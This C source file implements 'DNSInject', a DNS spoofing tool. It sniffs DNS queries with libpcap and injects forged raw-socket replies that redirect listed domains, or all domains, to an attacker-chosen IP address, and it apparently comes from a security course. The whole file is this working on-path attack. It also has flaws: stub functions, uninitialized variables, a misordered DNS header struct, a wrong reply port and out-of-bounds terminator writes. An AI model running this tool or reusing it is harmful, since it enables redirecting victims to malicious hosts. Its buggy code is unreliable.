
#include <sys/socket.h>
#include <arpa/inet.h>
#include <time.h>
#include <netdb.h>
#include <unistd.h>
#include <net/ethernet.h>
#include <netinet/ip.h>
#include <netinet/udp.h>



#include <stdio.h>
#include <pcap.h>
#include <getopt.h>
#include <netinet/in.h>

#include <errno.h>
#include <sys/types.h>

#include <resolv.h>
#include <sys/ioctl.h>
#include <net/if.h>

#include <string.h>
#include <stdlib.h>
#include <ctype.h>



#define IPSIZE 16
#define PACSIZE 8192


struct ethernetheader {
	u_char ether_dhost[ETHER_ADDR_LEN];
	u_char ether_shost[ETHER_ADDR_LEN];
	u_short ether_type;
};




//DNS ques structure 
struct dns_ques 
{
	char *qname;
	char qclass[2];
	char qtype[2];
	
};


struct dns_header 
{
	char id[2];
	char nscount[2];
	char arcount[2];
	char qdcount[2];
	char ancount[2];
	char flags[2];
};

/* Link list node for file options */
struct node 
{
	char spoofipaddress[32];
	char spoofdomain[150];
	struct node *next;
};

/*
 * In this it described how to send  a packet like DNS reply using raw sockets
 * http://www.binarytides.com/raw-sockets-c-code-linux/
 */
void replyDNSPacket(char* ipaddr,  char* packet, u_int16_t portno, int packetlen) {
	struct sockaddr_in destaddr;
	int sentbytes, sock, one = 1;

	sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
	if (sock < 0) {
		fprintf(stderr, "DNSInject: Socket is not created \n");
		return;
	}

	destaddr.sin_family = AF_INET;
	destaddr.sin_port = htons(portno);
	destaddr.sin_addr.s_addr = inet_addr(ipaddr);

	if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
		fprintf(stderr, "DNSInject: Socket port not set \n");
		return;
	}

	sentbytes = sendto(sock, packet, packetlen, 0, (struct sockaddr *)&destaddr, sizeof(destaddr));
	if (sentbytes < 0)
		fprintf(stderr, "DNSInject:Data is not sent \n");
}
//get the I.P address of the attcker
void callgetIP()
{
	/*we need to calculate the i.p address of the network interfce


	*/
}
/*
 * http://www.microhowto.info/howto/get_the_ip_address_of_a_network_interface_in_c_using_siocgifaddr.html
 */
void getAttackerIP(char *iterfacename, char *ip) {
	struct ifreq ifr;

	size_t iterfacename_len = strlen(iterfacename);

	if (iterfacename_len < sizeof(ifr.ifr_name)) {
		memcpy(ifr.ifr_name, iterfacename, iterfacename_len);
		ifr.ifr_name[iterfacename_len] = 0;
	} else {
		fprintf(stderr, "DNSInject: interface name is too long");
	}

	int fd = socket(AF_INET, SOCK_DGRAM, 0);
	if (fd == -1) {
		fprintf(stderr, "%s", strerror(errno));
	}

	if (ioctl(fd, SIOCGIFADDR, &ifr) == -1) {
		int temp_errno = errno;
		close(fd);
		fprintf(stderr, "%s", strerror(temp_errno));
	}
	close(fd);

	struct sockaddr_in* ipaddr = (struct sockaddr_in*)&ifr.ifr_addr;
	memcpy(ip, inet_ntoa(ipaddr->sin_addr), 32);
}

void forceSpoof()
{
   /*Spoof the actual I.P
   address with the attckers hostname or the one provided in the list

   */
}
/*
 * http://web.eecs.utk.edu/~cs594np/unp/checksum.html
 */
unsigned short chksum(unsigned short *buffer, int len) {
	long sum = 0;  /* assume 32 bit long, 16 bit short */

	while (len > 1) {
		sum += *buffer++;
		if (sum & 0x80000000)  /* if high order bit set, fold */
			sum = (sum & 0xFFFF) + (sum >> 16);
		len -= 2;
	}

	if (len)      /* take care of left over byte */
		sum += (unsigned short) * (unsigned char *)buffer;

	while (sum >> 16)
		sum = (sum & 0xFFFF) + (sum >> 16);

	return ~sum;
}




/* The callback function for pcap_loop */
void injectDNSCallback(struct node *arguments, const struct pcap_pkthdr *header, const u_char *packet)
{
	struct ethernetheader *ether;
	struct udphdr *udp;
	struct iphdr *ip;
	struct udphdr *replyudphdr;
	struct ip *replyiphdr;

	struct dns_header *dnshdr;

	char *domainname;

	char srcIP[IPSIZE];
	unsigned int ipHeaderSize;
	u_int16_t port;
	char request[150];
	char replypacket[PACSIZE];

	struct dns_ques question, *dns_ques_in;

	char  dstIP[IPSIZE];
	unsigned char split_ip[4];
	struct in_addr dest, src;
	


	
	unsigned int replypacketsize;
	char spoofipaddress[32], *reply;
	
	struct node *current;

	int size,k;
	int i = 1; 
	int j = 0;
	int isspoofed = 0;




	if(i== 1)
		callgetIP();



	memset(replypacket, 0, PACSIZE);

	/* define ethernet header */
	ether = (struct ethernetheader*)(packet);
	ip = (struct iphdr*)(((char*) ether) + sizeof(struct ethernetheader));

	/* get cleaned up IPs */
	src.s_addr = ip->saddr;
	dest.s_addr = ip->daddr;

	//inet_ntoa converts IP4 address into ASCII string  
	sprintf(srcIP, "%s", inet_ntoa(src));
	

	/* udp header */
	ipHeaderSize = ip->ihl * 4;
	udp = (struct udphdr*)(((char*) ip) + ipHeaderSize);

	//inet_ntoa converts IP4 address into ASCII string 
	sprintf(dstIP, "%s", inet_ntoa(dest));



	/* dns header */
	dnshdr = (struct dns_header*)(((char*) udp) + sizeof(struct udphdr));
	question.qname = ((char*) dnshdr) + sizeof(struct dns_header);

	/*
	 * parse domain name
	 * [3]www[7]example[3]com -> www.example.com
	 */
	domainname = question.qname;
	size = domainname[0];
	while (size > 0) {
		for (k = 0; k < size; k++) {
			request[j++] = domainname[i + k];
		}
		request[j++] = '.';
		i += size;
		size = domainname[i++];
	}
	request[--j] = '\0';

	/* get spoof IP */
	if (!strcmp(arguments->spoofdomain, "spoof_all")) {
		isspoofed = 1;
		memcpy(spoofipaddress, arguments->spoofipaddress, 32);
	} else {
		current = arguments;
		while (current != NULL) {
			if (!strcmp(current->spoofdomain, request)) {
				memcpy(spoofipaddress, current->spoofipaddress, 32);
				isspoofed = 1;
			}
			current = current->next;
		}
	}


	if (isspoofed == 0) {
		/*Spofing is not being done */
		forceSpoof();
	}




	if (isspoofed == 1) {
		/* reply is pointed to the beginning of dns header */
		reply = replypacket + sizeof(struct ip) + sizeof(struct udphdr);

		/* reply dnshdr */
		memcpy(&reply[0], dnshdr->id, 2);


		memcpy(&reply[2], "\x81\x80\x00\x01\x00\x01\x00\x00\x00\x00", 10);

		/* reply dns_ques */
		dns_ques_in = (struct dns_ques*)(((char*) dnshdr) + sizeof(struct dns_header));
		size = strlen(request) + 2;
		memcpy(&reply[12], dns_ques_in, size);
		size += 12;
		memcpy(&reply[size], "\x00\x01\x00\x01", 4);
		size += 4;

		/* reply dns_answer */
		memcpy(&reply[size], "\xc0\x0c\x00\x01\x00\x01\x00\x00\x00\x22\x00\x04", 12);
		size += 12;
		sscanf(spoofipaddress, "%d.%d.%d.%d", (int *)&split_ip[0], (int *)&split_ip[1], (int *)&split_ip[2], (int *)&split_ip[3]);
		memcpy(&reply[size], split_ip, 4);
		size += 4;

		replypacketsize = size;

		/* values from http://www.binarytides.com/raw-sockets-c-code-linux/ */

		/*
		Intialising the the reply ap,udp with len, tos,ttl,ip sum etc.   */


		replyiphdr = (struct ip *) replypacket;
		replyudphdr = (struct udphdr *) (replypacket + sizeof (struct ip));
		replyiphdr->ip_hl = 5;
		
		replyiphdr->ip_tos = 0;
		replyiphdr->ip_len = sizeof(struct ip) + sizeof(struct udphdr) + replypacketsize;
		
		replyiphdr->ip_src.s_addr = inet_addr(dstIP);

		replyiphdr->ip_v = 4;


		replyiphdr->ip_dst.s_addr = inet_addr(srcIP);


		replyiphdr->ip_id = 0;
		replyiphdr->ip_off = 0;
		replyiphdr->ip_ttl = 255;
		replyiphdr->ip_p = 17;
		replyiphdr->ip_sum = 0;





		replyudphdr->source = htons(53);
		replyudphdr->dest = udp->source;
		replyudphdr->len = htons(sizeof(struct udphdr) + replypacketsize);
		replyudphdr->check = 0;

		replyiphdr->ip_sum = chksum((unsigned short *) replypacket, replyiphdr->ip_len >> 1);

		/* update the packet size with ip and udp header */
		replypacketsize += (sizeof(struct ip) + sizeof(struct udphdr));

		/* sends our dns spoof response */
		replyDNSPacket(srcIP,  replypacket, ntohs((*(u_int16_t*)&udp)),replypacketsize);

		printf("DNSInject : Spoofed  request is %s Src Ip requested from %s\n", request, srcIP);
	} 
	else 
	{
		printf("DNSInject :Not Spoofing request %s requested from %s .It's not listed in file.\n", request, srcIP);
	}
}
void checkOptions()
{
	int i,j;

	int *p = malloc(10);

	int k = i + j;

	/*To readthe options from the command promt 

	*/
}

int main(int argc, char *argv[])
{
	char *dev = NULL;
	char errbuffer[PCAP_ERRBUF_SIZE];
	bpf_u_int32 net,mask;
	struct bpf_program fp;
	char *bpffilterexp;			/* The input BPF filter expression */
	char *filterexp;				/* Final filter expression to be used */
	
	pcap_t *handle;					/* packet capture handle */
	int interfaceprovided = 0;
	int readfile = 0;

	struct node *head;
	char *line = NULL;

	
	int bpffilter = 0;
	int option = 0;
	char *filename;
	
	size_t len = 0;
	ssize_t read;
	char delimiter[] = " \t\n";
	char *token;
	char spoofipaddress[32];


	struct node *current;

	struct node *freenode;



	char *dnsfilter = "udp and dst port domain";

	memset(errbuffer, 0, PCAP_ERRBUF_SIZE);


	checkOptions();
	/* Parse the command line arguments */
	while ((option = getopt(argc, argv, "i:h:t")) != -1) 
	{
		switch (option) 
		{
		case 'i':
			if (interfaceprovided) 
			{
				printf("More than one device  not supported \n");
				exit(EXIT_FAILURE);
			}
			dev = optarg;
			interfaceprovided = 1;
			break;
		case 'h':
			if (readfile) 
			{
				printf("More than one file  not supported \n ");
				       
				exit(EXIT_FAILURE);
			}
			filename = optarg;
			readfile = 1;
			break;
		case 't':
			printf("t for help: \n");
			exit(EXIT_SUCCESS);
			break;
		default:
			printf("Exiting .missing argument or unknown option .\n");
			exit(EXIT_FAILURE);
		}
	}

	if (optind < argc) 
	{
		bpffilterexp = argv[optind];
		bpffilter = 1;
	}

	/* if interface not provided by user, set through pcap library */
	if (interfaceprovided != 1) 
	{
		dev = pcap_lookupdev(errbuffer);
		if (dev == NULL) 
		{
			fprintf(stderr, "default device not found: %s\n", errbuffer);
			exit(EXIT_FAILURE);
		}
	}

	/* if hostnames file is provided by user, parse that */
	if (readfile == 1) 
	{
		FILE *fptr = fopen(filename, "r");
		if (fptr == 0) 
		{
			fprintf(stderr, "Failed to open host file\n");
			exit(EXIT_FAILURE);
		}

		head = current = NULL;
		while ((read = getline(&line, &len, fptr)) != -1) 
		{
			if (read <= 9) 
			{
				fprintf(stderr, " File is corrupted .\n");
				goto free_list;
			}
			
			token = strtok(line, delimiter);

			struct node *newnode = malloc(sizeof(struct node));
			memcpy(newnode->spoofipaddress, token, 16);


			newnode->spoofipaddress[17] = '\0';
			token = strtok(NULL, delimiter);
			memcpy(newnode->spoofdomain, token, strlen(token));
			newnode->spoofdomain[strlen(token) + 1] = '\0';
			newnode->next = NULL;


			if (head == NULL) 
			{
				current = head = newnode;
			} 
			else 
			{
				current->next = newnode;
				current = current->next;
			}
		}


		fclose(fptr);
	} 
	else 
	{ /* file not provided - spoof all with attackers IP */
		struct node *newnode = malloc(sizeof(struct node));
		getAttackerIP(dev, spoofipaddress);
		memcpy(newnode->spoofipaddress, spoofipaddress, 16);
		newnode->spoofipaddress[17] = '\0';
		memcpy(newnode->spoofdomain, "spoof_all", 9);
		newnode->spoofdomain[10] = '\0';
		head = newnode;
	}


	/*
	 We need to know the network mask
	 for  applying  the filter

	 */
	if (pcap_lookupnet(dev, &net, &mask, errbuffer) == -1) {
		fprintf(stderr, "Can't get netmask for device %s\n", dev);
		net = 0;
		mask = 0;
	}

	handle = pcap_open_live(dev, BUFSIZ, 1, 0, errbuffer);
	if (handle == NULL) 
	{
		fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuffer);
		goto free_list;
	} 
	else 
	{
		printf("Listening on device: %s\n\n", dev);
	}

	//getting the   BPF filter 
	if (bpffilter == 1) 
	{
		filterexp = malloc(strlen(dnsfilter) + strlen(bpffilterexp) + 6);
		strcpy(filterexp, dnsfilter);
		strcat(filterexp, " and ");
		strcat(filterexp, bpffilterexp);
	} 
	else 
	{
		filterexp = malloc(strlen(dnsfilter) + 1);
		strcpy(filterexp, dnsfilter);
	}

	// Here we  compile it
	if (pcap_compile(handle, &fp, filterexp, 0, 0) == -1) 
	{
		fprintf(stderr, "Couldn't parse filter %s: %s\n", filterexp,
		        pcap_geterr(handle));
		goto free_filter;
	}

	// apply the filter 
	if (pcap_setfilter(handle, &fp) == -1) 
	{
		fprintf(stderr, "Couldn't install filter %s: %s\n", filterexp,
		        pcap_geterr(handle));
		goto free_filter;
	}

	

	pcap_loop(handle, -1, injectDNSCallback, (u_char *)head);

	
	pcap_freecode(&fp);
	pcap_close(handle);

free_filter:
	free(filterexp);
free_list:
	if (readfile == 1) {
		current = head;
		while (current != NULL) {
			freenode = current;
			current = current->next;
			free(freenode);
		}
	}
	return 0;
}
